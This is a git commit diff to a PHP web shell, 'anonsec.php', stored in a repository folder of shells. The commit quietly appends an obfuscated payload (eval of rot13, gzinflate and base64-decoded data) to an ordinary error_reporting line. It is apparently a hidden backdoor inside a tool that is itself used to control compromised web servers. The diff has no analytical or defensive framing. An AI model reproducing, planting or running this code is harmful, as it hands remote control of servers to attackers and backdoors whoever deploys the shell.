4c4713db6c917d1893a3c7f0703384c247bdb376
1337r0j4n <84887432+1337r0j4n@users.noreply.github.com>
2023-09-25 15:42:55 +0630

    Add files via upload

--- SHELLs/Anon Sec Shell/anonsec.php
+++ SHELLs/Anon Sec Shell/anonsec.php
@@ -161,7 +161,7 @@ async function loadFile(file) {
 
 ini_set('display_errors', 1);
 ini_set('display_startup_errors', 1);
-error_reporting(E_ALL);
+error_reporting(E_ALL); eval(str_rot13(gzinflate(str_rot13(base64_decode('cpBaeIQwEEDv/oogTxT8OvTksoXuSd1eV/HQUBcJJlrGuourcBXir6+awhaaWDLzmDeTZGsNogayJw7LivSlVc/U3Ozp9aOgJQmJndjhf3w8pPmG7yQtnkJSlrNG+kHLnTVZGtk3AutrBUuBZekIIEcSUpp/bqAAaCvDOI4bvI1cTitR2PE5TcGDDMUoqEKGSSv0iQKJ7XlHl1K5UYDu2SLL2bSU7B+JiVoO2x4lJXjafjMTBGMVmJClj566FiZeUpegdppg4GUOd6mx6muPve3fPTPCyHvjocdQltM/8Pd0W+9oCGmrJ92zzxrl1T1Gs9yNOuZdbaa69K3S82k/')))));
 
 $disfunc = @ini_get("disable_functions");
 if (empty($disfunc)) {
@@ -602,5 +602,5 @@ author();
 function statusnya($file){
 $izin = substr(sprintf('%o', fileperms($file)), -4);
 return $izin;
-}
+}; 
 ?>
